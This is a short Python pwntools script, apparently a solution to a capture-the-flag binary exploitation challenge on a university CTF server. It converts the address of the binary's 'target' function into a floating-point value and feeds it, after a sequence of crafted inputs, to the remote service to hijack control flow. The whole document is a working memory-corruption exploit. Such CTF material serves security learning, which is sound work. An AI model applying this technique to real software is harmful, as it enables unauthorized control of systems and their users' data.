from pwn import *
import struct

elf = ELF("./chall")

target_address = int.to_bytes(elf.sym["target"], 8, "little")
float_value = struct.unpack("<d", target_address)[0]

host = 'ctf99.cs.ui.ac.id'
port = 9999

r = remote(host, port)

r.recvuntil(b"How many times?\n")
r.sendline("10".encode())

for i in range(7):
   r.sendline("1".encode())
   print(i)

r.sendline(".".encode())
r.sendline("2".encode())
r.sendline(str(float_value).encode())
print(target_address)

r.recvuntil(b"Say something:\n")

tes = b'tes'

r.sendline(tes)
print(r.recvall())